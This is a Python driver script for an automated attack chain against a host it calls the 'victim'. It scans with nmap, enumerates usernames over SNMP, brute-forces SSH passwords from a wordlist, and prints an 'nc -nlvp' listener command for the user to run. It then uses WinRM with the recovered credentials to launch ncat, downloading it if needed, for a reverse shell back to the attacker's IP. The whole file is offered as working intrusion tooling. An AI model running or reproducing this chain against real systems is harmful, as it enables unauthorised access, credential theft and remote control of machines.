from scanner import HostScanner, PortScanner, scanner_homepage
from snmp_check import SNMPCheck
from sshbruteforce import SSHBruteForce
from winrmE import WinRM
import sys, time

if __name__=="__main__":
    #####################
    # Nmap time
    #####################
    scan=input("Do you want to perform nmap scan (y/N): ")
    myIP = victimIP = None
    if scan=='y':
        myIP, victimIP = scanner_homepage()
    if not isinstance(myIP, str):
        print("Cannot get Your IP from scanner.py")
        myIP = input("Enter your IP: ")
    if not isinstance(victimIP, str):
        print("Cannot get victim IP from scanner.py")
        victimIP = input("Enter victim IP: ")

    #####################
    # SNMP check
    #####################
    snmp = SNMPCheck(victimIP)
    snmpCheck = snmp.check_snmp_check()
    if snmpCheck:
        snmpahead = input("Enter (y) to display snmpOutput: ")
        if snmpahead == 'y':
            snmp.show_snmp_result()
        username = snmp.find_username()
        if isinstance(username, str):
            pass
        else:
            print("Cannot detect username")
            print("Here are a list of usernames found")
            snmp.printAllUsers()
            username = input("Enter username to go: ")
    else:
        print("No snmp details so ")
        username = input("Enter username to go: ")

    ####################
    # SSH Bruteforce
    ####################
    sshport = input("Enter ssh port (Default 22) :")
    if sshport != "":
        try:
            sshport = int(sshport)
        except Exception as e:
            print("Invalid port using 22 default")
            sshport = 22
    else:
        sshport = 22
    passwordfile = input("Enter location of password file (Enter for default): ")
    if passwordfile == "":
        ssh = SSHBruteForce(victimIP, username=username, port=sshport)
    else:
        ssh = SSHBruteForce(victimIP, username=username, port=sshport, passwordfile=passwordfile)
    password = ssh.bruteforce()
    if password == False:
        print("Couldn't find password.")
        password = input("Enter password for "+username+" : ")
    
    ####################
    # ncat listener
    ####################
    print("Start a nc listener")
    ncport = input("Enter port or enter for default port 4321: ")
    if ncport == "":
        ncport = "4321"
    print("In terminal: nc -nlvp "+ncport)
    input("Enter to continue...")
    
    ####################
    # WinRM
    ####################
    
    winrm = WinRM(myIP, ncport, victimIP, username, password)
    if not winrm.testRM():
        sys.exit()
    ncrun = winrm.runNCsession()
    if ncrun == False:
        print("Downloading Ncat...")
        ncDownload = winrm.downloadNC()
        time.sleep(20)
        if True:
            if winrm.runNCsession():
                print("Successful! Get the reverse shell [DOWNLOADED]")
            else:
                print("Couldn't start nc after download")
        else:
            print("Couldn't download nc")
    else:
        print("Successful! Get the reverse shell")